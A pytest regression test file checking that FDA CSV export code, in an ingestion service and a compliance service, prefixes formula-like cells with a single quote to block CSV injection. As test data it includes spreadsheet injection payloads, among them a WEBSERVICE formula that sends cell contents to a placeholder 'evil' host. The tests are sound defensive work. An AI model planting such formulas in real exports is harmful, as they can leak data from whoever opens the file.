"""FDA export hardening regression tests.

Direct-call unit tests (no FastAPI client required) that assert the
security- and compliance-critical invariants every FDA export pathway
must satisfy.

Covers:

* #1081 — CSV formula injection in the ingestion-side
  ``fda_export_service._event_to_fda_row``.
* #1272 — CSV formula injection in the compliance-side
  ``fsma_spreadsheet.generate_fda_csv``.
* #1283 — ``requesting_entity`` / user-supplied metadata sanitization
  in the compliance spreadsheet header block.

Each test locally imports the target module using importlib so the
ingestion and compliance ``app/`` namespaces do not collide when both
services' tests run in the same pytest session.
"""

from __future__ import annotations

import csv
import importlib.util
import io
import sys
from pathlib import Path

import pytest


_REPO_ROOT = Path(__file__).resolve().parent.parent.parent
_INGESTION_DIR = _REPO_ROOT / "services" / "ingestion"
_COMPLIANCE_DIR = _REPO_ROOT / "services" / "compliance"
_SERVICES_DIR = _REPO_ROOT / "services"


def _load_module_under_name(name: str, path: Path):
    """Load a Python file as a fresh module under a synthetic name.

    Avoids polluting ``sys.modules['app']`` so the ingestion and
    compliance trees don't mask each other.
    """
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec and spec.loader, f"cannot load {path}"
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture(scope="module")
def ingestion_csv_safety():
    return _load_module_under_name(
        "regengine_test_ingestion_csv_safety",
        _INGESTION_DIR / "app" / "shared" / "csv_safety.py",
    )


@pytest.fixture(scope="module")
def compliance_csv_safety():
    return _load_module_under_name(
        "regengine_test_compliance_csv_safety",
        _COMPLIANCE_DIR / "app" / "csv_safety.py",
    )


@pytest.fixture(scope="module")
def compliance_fsma_spreadsheet(compliance_csv_safety):
    """Load the compliance ``fsma_spreadsheet`` module with its
    ``.csv_safety`` relative import pre-satisfied.
    """
    # fsma_spreadsheet does ``from .csv_safety import ...`` which requires
    # the module to be loaded as part of a package. Simplest path: cd the
    # sys.path to include services/compliance, install a package shim,
    # then importlib-load.
    if str(_COMPLIANCE_DIR) not in sys.path:
        sys.path.insert(0, str(_COMPLIANCE_DIR))

    # Pre-load the package root so relative imports work.
    pkg_spec = importlib.util.spec_from_file_location(
        "regengine_compliance_app",
        _COMPLIANCE_DIR / "app" / "__init__.py",
        submodule_search_locations=[str(_COMPLIANCE_DIR / "app")],
    )
    pkg = importlib.util.module_from_spec(pkg_spec)
    sys.modules["regengine_compliance_app"] = pkg
    pkg_spec.loader.exec_module(pkg)
    # Also register ``.csv_safety`` under the package.
    sys.modules["regengine_compliance_app.csv_safety"] = compliance_csv_safety

    spec = importlib.util.spec_from_file_location(
        "regengine_compliance_app.fsma_spreadsheet",
        _COMPLIANCE_DIR / "app" / "fsma_spreadsheet.py",
    )
    mod = importlib.util.module_from_spec(spec)
    sys.modules["regengine_compliance_app.fsma_spreadsheet"] = mod
    spec.loader.exec_module(mod)
    return mod


# ---------------------------------------------------------------------------
# shared sanitize_cell helper
# ---------------------------------------------------------------------------

def test_sanitize_cell_prefixes_formula_indicators(
    ingestion_csv_safety, compliance_csv_safety
):
    """`=`, `+`, `-`, `@`, `\\t`, `\\r` all get single-quote prefixed."""
    dangerous = [
        "=WEBSERVICE(\"http://evil/?x=\"&A1)",
        "=1+1",
        "+cmd",
        "-cmd",
        "@SUM(A1)",
        "\tinjected",
        "\rinjected",
    ]
    for value in dangerous:
        for fn in (
            ingestion_csv_safety.sanitize_cell,
            compliance_csv_safety.sanitize_cell,
        ):
            sanitized = fn(value)
            assert sanitized.startswith("'"), (
                f"expected single-quote prefix, got {sanitized!r}"
            )
            assert sanitized[1:] == value

    # Benign values pass through unchanged.
    for value in ["Romaine Hearts", "TLC-2026-001", "120.0", ""]:
        for fn in (
            ingestion_csv_safety.sanitize_cell,
            compliance_csv_safety.sanitize_cell,
        ):
            assert fn(value) == value

    # None renders as empty string.
    for fn in (
        ingestion_csv_safety.sanitize_cell,
        compliance_csv_safety.sanitize_cell,
    ):
        assert fn(None) == ""


# ---------------------------------------------------------------------------
# #1272 — compliance fsma_spreadsheet formula escaping
# ---------------------------------------------------------------------------

def test_1272_compliance_spreadsheet_neutralizes_formula_prefixes(
    compliance_fsma_spreadsheet,
):
    """The compliance-service CSV generator must neutralize formula
    prefixes in both metadata rows and data rows.
    """
    generate_fda_csv = compliance_fsma_spreadsheet.generate_fda_csv

    events = [
        {
            "type": "SHIPPING",
            "tlc": "TLC-001",
            "product_description": "=WEBSERVICE(\"http://evil\")",
            "quantity": 100,
            "uom": "cases",
            "facility_gln": "1111111111111",
            "facility_name": "@SUM(A1)",
            "facility_address": "-cmd",
            "kdes": {
                "event_date": "2026-04-17T10:00:00+00:00",
                "ship_from_location": "+EVIL",
                "temperature": "=1+1",
            },
        },
    ]

    csv_text = generate_fda_csv(
        events,
        start_date="2026-04-01",
        end_date="2026-04-17",
        requesting_entity="=WEBSERVICE(\"http://evil\")",
    )
    rows = list(csv.reader(io.StringIO(csv_text)))

    # The "Requesting Entity" metadata row is user-controlled via URL.
    requesting_row = next(r for r in rows if r and r[0] == "Requesting Entity")
    assert requesting_row[1].startswith("'="), (
        f"requesting_entity not sanitized: {requesting_row[1]!r}"
    )

    # Find the data row (the one containing TLC-001).
    data_row = next(r for r in rows if r and "TLC-001" in r)
    # At least one cell must start with ``'`` (the sanitized formulas).
    assert any(cell.startswith("'") for cell in data_row), (
        f"expected a sanitized cell in {data_row}"
    )
    # Specifically, the product_description was ``=WEBSERVICE...``.
    assert any(c.startswith("'=WEBSERVICE") for c in data_row), (
        f"product_description not sanitized in {data_row}"
    )


def test_1272_benign_values_pass_through_unchanged(compliance_fsma_spreadsheet):
    """Non-dangerous values must not gain a leading single quote."""
    generate_fda_csv = compliance_fsma_spreadsheet.generate_fda_csv

    events = [
        {
            "type": "SHIPPING",
            "tlc": "TLC-001",
            "product_description": "Romaine Hearts",
            "quantity": 100,
            "uom": "cases",
            "facility_gln": "1111111111111",
            "facility_name": "Acme Farms",
            "kdes": {"event_date": "2026-04-17T10:00:00+00:00"},
        }
    ]

    csv_text = generate_fda_csv(
        events,
        start_date="2026-04-01",
        end_date="2026-04-17",
        requesting_entity="FDA District Office",
    )
    assert "'Romaine" not in csv_text
    assert "'Acme" not in csv_text
    assert "'FDA District" not in csv_text
    assert "Romaine Hearts" in csv_text
